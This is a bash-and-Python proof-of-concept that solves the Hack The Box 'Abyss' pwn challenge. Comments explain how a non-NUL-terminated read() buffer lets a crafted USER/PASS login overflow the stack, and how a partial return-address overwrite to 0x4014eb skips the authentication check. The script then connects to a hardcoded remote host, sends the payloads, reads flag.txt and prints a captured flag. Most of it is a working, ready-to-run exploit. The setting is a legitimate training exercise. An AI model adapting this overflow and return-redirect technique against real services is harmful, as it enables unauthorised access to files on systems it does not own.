#!/usr/bin/env bash

set -euo pipefail

# Challenge: Abyss
# Platform: Hack The Box - CTF Try Out
# Category: Pwn / Binary Exploitation
#
# Scenario summary:
# The binary implements a tiny command protocol:
#   0 = LOGIN
#   1 = READ
#   2 = EXIT
#
# It loads random credentials from .creds into global variables and then waits
# for raw integer commands. At first glance this looks like a normal
# authentication gate around file reads, but the parser inside cmd_login() is
# unsafe.
#
# Why this is vulnerable:
# The code reads 512 raw bytes into a stack buffer and then copies bytes from
# "USER ..." / "PASS ..." into local arrays one byte at a time until it finds
# a NUL byte.
#
# The bug is that read() does not append a terminator.
# If we send a full 512-byte PASS buffer with no NUL byte, the loop keeps
# reading past the end of the input buffer and starts re-reading bytes from
# adjacent stack memory that it is also writing to. That becomes a controlled
# stack overflow.
#
# Real-world lesson:
# Many developers assume "input from read() behaves like a C string". It does
# not. Functions like read(), recv(), and fread() return raw byte counts. If
# you later process that data as if it were NUL-terminated text, you create
# parser bugs, out-of-bounds reads, and often stack corruption.
#
# Exploit strategy used here:
# We do not need a full long ROP chain.
# A smaller and cleaner trick works:
#
# 1. Start a LOGIN command.
# 2. Send a crafted USER value.
# 3. Send a 512-byte PASS value with no NUL byte.
# 4. The PASS parsing overflow partially overwrites the saved return address.
# 5. We redirect execution to 0x4014eb, which is inside cmd_read() just after
#    the "logged_in" check has already been passed.
# 6. The function then performs the file open/read/write path directly.
# 7. We provide "flag.txt" as the filename and receive the flag.
#
# Important nuance:
# Because the input loop stops on the first NUL byte, full 8-byte addresses are
# awkward to place directly in the overflowing data. The intended trick is a
# partial return-address overwrite. Only the low three bytes are changed:
#   original return address -> something in main()
#   overwritten low bytes   -> 0x4014eb
#
# The stable payload used in this solve:
#   USER  = 'a' * (0x5 + 0xc) + '\\x1c' + 'k' * 0xb + '\\xeb\\x14\\x40'
#   PASS  = 'b' * (0x200 - 5) prefixed by "PASS "
#   PATH  = "flag.txt"
#
# Remote target used during solve:
#   154.57.164.72:32179
#
# Manual reproduction idea:
# A pwntools script is common for challenges like this, but for portability
# this PoC uses only the Python standard library so it runs on a plain Linux
# system without extra packages.
#
# Final live flag obtained during testing:
#   HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_310873ad542dac635c2bd22f3f1e8cf7}

HOST="${1:-154.57.164.72}"
PORT="${2:-32179}"

python3 - "$HOST" "$PORT" <<'PY'
import re
import socket
import struct
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])

# Partial overwrite target: 0x4014eb
# We only place the low 3 bytes because a full 8-byte address would introduce
# early NUL bytes and break the vulnerable copy loop.
ret = b"\xeb\x14\x40"

# This USER payload was derived from the parser's stack behavior.
# It positions the later overflow so the saved RIP gets the 3-byte partial
# overwrite we want during PASS processing.
user_payload = b"a" * (0x5 + 0xC) + b"\x1c" + b"k" * 0xB + ret

# Full-size PASS payload with no NUL byte.
pass_payload = b"b" * (0x200 - 5)

with socket.create_connection((host, port), timeout=8) as s:
    # Disable Nagle so our small protocol chunks stay separated more reliably.
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    # Step 1: LOGIN command (little-endian integer 0).
    s.send(struct.pack("<I", 0))
    time.sleep(0.6)

    # Step 2: USER stage.
    s.send(b"USER " + user_payload)
    time.sleep(0.6)

    # Step 3: PASS stage triggers the parser overflow.
    s.send(b"PASS " + pass_payload)
    time.sleep(0.6)

    # Step 4: Because execution is redirected into the READ path, the next
    # bytes we send are treated as the filename argument.
    s.send(b"flag.txt")

    s.settimeout(2)
    chunks = []
    while True:
        try:
            data = s.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)

output = b"".join(chunks).decode("latin-1", errors="ignore")
match = re.search(r"HTB\{[^}]+\}", output)

if not match:
    print(output)
    raise SystemExit("[-] Flag not found in response.")

print(match.group(0))
PY
